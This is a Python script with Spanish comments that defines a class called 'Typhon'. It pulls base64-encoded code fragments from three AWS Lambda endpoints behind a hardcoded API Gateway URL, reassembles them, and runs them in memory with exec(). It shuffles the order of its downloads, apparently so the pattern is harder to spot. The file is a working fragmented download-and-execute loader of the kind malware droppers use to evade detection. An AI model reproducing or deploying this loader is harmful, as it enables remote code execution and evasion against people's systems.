import urllib.request
import json
import base64
import random

class Typhon:
    """
    Obtiene fragmentos de distintas funciones lambda en la nube, los orquesta y los ejecuta en memoria.
    
    """

    def __init__(self, url):
        # Normalizamos la URL (para que no se ponga //Ladon)
        self.url = url.rstrip('/')

        # Endpoints (cada uno representa una función Lambda)
        self.endpoints = {
            "1": f"{self.url}/Ladon",
            "2": f"{self.url}/Orthrus",
            "3": f"{self.url}/Hydra"
        }

        # Fragmentos recibidos
        self.fragments = {}

    def downloadFragment(self, fragment_name): #fragment_name es un string, que en nuestro caso es "1", "2" o "3"
        """
        Pide un fragmento a una lambda.

        El endpoint devuelve un JSON donde el campo 'body' contiene
        otro JSON:
            {
                'statusCode': 200,
                'body': json.dumps({
                    "module_id": X,
                    "content": encoded,
                    "is_bin": X
                })
            }

        El contenido real se encuentra dentro del campo 'body' y es un json.
        """
        try:
            # Petición GET al endpoint de cada lambda
            response = urllib.request.urlopen(self.endpoints[fragment_name])
            response_json =  json.loads(response.read().decode('utf-8'))

            if response_json['statusCode'] == 200:

                body = json.loads(response_json['body'])
                # Decodificamos el campo content que se ha codificado en las lambdas (base64)
                content = base64.b64decode(body['content'])

                # Almacenamos el fragmento en memoria, si es binario hay que transformar los bytes y si no, se decodifica
                if body['is_bin'] == 1:
                    payload = f"texto = {repr(content)}" 
                    self.fragments[fragment_name] = payload
                else:
                    self.fragments[fragment_name] = content.decode('utf-8')
                
            else:
                print(f"[ERROR] {fragment_name} Ha habido un error (Status: {response.getCode()})")
        except Exception as e:
            print(f"[ERROR] Error contactando con {fragment_name}: {e}")

    def action(self, fragments):
        """
        Reconstruye el contenido final a partir de los fragmentos obtenidos, muestra en un log.txt el codigo reconstruido y lo ejecuta
        (Todo esto en memoria salvo el log.txt que se guarda en el disco para ver el código ensamblado (para verificar su correcta funcionalidad)).
        
        """
        # Verificamos que se hayan recibido todos los fragmentos (en este caso hay 3)
        if len(self.fragments) < len(self.endpoints):
            print("\n[ERROR] No se han podido unir todos los fragmentos")
            return
        
        # Orquestación
        action = ""
        for fragment in fragments: 
            action += f"{self.fragments[fragment]}"

        # Mostrar el código generado en un log.txt
        with open("log.txt", "w") as f:
            f.write(action)

        # Ejecutar el código ensamblado
        exec(action, globals()) 

if __name__ == "__main__":
    # URL DE API GATEWAY
    URL_API = "https://b4hr04pdjl.execute-api.us-east-1.amazonaws.com/Typhon_S1"
    
    typhon = Typhon(URL_API)

    # Lista de fragmentos esperados
    fragments = ["1", "2", "3"]

    fragments_copy = fragments.copy()
    random.shuffle(fragments_copy) # para que los fragmentos no sigan siempre el mismo orden 1,2,3
    
    # Descarga de cada fragmento
    for fragment in fragments_copy:
        typhon.downloadFragment(fragment)
    
    # Ensamblado final y activacion
    typhon.action(fragments)